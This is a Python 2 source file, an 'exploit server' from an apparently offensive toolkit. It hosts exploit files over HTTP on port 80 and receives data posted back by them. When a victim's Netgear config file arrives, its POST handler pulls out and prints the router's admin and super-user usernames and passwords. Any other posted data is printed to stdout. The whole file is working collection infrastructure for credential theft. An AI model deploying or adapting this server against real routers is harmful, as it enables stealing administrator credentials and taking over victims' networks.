#!/usr/bin/env python
#
# nbns_server.py: Simple http server to host exploits and receive data from exploits.
# Copyright (C) 2011 Simon Weber <sweb090@gmail.com>
# Code published under GPLv2; see LICENSE file

import sys
import getopt
import cgi
from os import curdir, sep
import BaseHTTPServer, SimpleHTTPServer
import socket

class ExploitHTTPServer(BaseHTTPServer.HTTPServer):
    """A stoppable http server.

    All successful requests are logged to stdout."""

    #Server code from: http://code.activestate.com/recipes/425210-simple-stoppable-server-using-socket-timeout/

    def server_bind(self):
        BaseHTTPServer.HTTPServer.server_bind(self)
        self.socket.settimeout(1)
        self.run = True

    def get_request(self):
        while self.run:
            try:
                sock, addr = self.socket.accept()
                sock.settimeout(None)
                return (sock, addr)
            except socket.timeout:
                pass

    def stop(self):
        self.run = False

    def serve(self):
        while self.run:
            self.handle_request()

    class ExploitRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
        """Serve files in the current directory and below. POST of 'netgear.cfg' will output values for keys in setting_file_keys, and any other POST will be output to stdout."""

        settings_file_keys = ['http_username', 'http_passwd', 'super_username', 'super_passwd']

        def do_POST(self):
            ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))

            length = int(self.headers.getheader('content-length'))
            body = {}
            if ctype == 'multipart/form-data':
                body = cgi.parse_multipart(self.rfile, pdict)
            elif ctype == 'application/x-www-form-urlencoded':
                qs = self.rfile.read(length)
                body = cgi.parse_qs(qs, keep_blank_values=1)


            if 'netgear.cfg' in body:
                print self.parse_settings_file(body['netgear.cfg'][0], self.settings_file_keys)
            else:
                print body

        @staticmethod
        def parse_settings_file(settings_file_contents, keys):
            """Return a dictionary of specified keys -> values from the given text from a settings file.

            Keys which are not found are mapped to None"""
            pairs = {}

            for key in keys:

                value_start = settings_file_contents.find(key)
                if value_start == -1:
                    pairs[key] = None
                    continue

                value_start = settings_file_contents.find('=', value_start) + 1
                value_end = settings_file_contents.find('\0', value_start)
                pairs[key] = settings_file_contents[value_start:value_end]

            return pairs

def main():
    exploit_server = ExploitHTTPServer(('', 80), ExploitHTTPServer.ExploitRequestHandler)
    
    try:
        print "Server started."
        exploit_server.serve()
    except (KeyboardInterrupt, SystemExit):
        exploit_server.stop()
        print
        print "Server stopped."


if __name__ == '__main__':
    main()
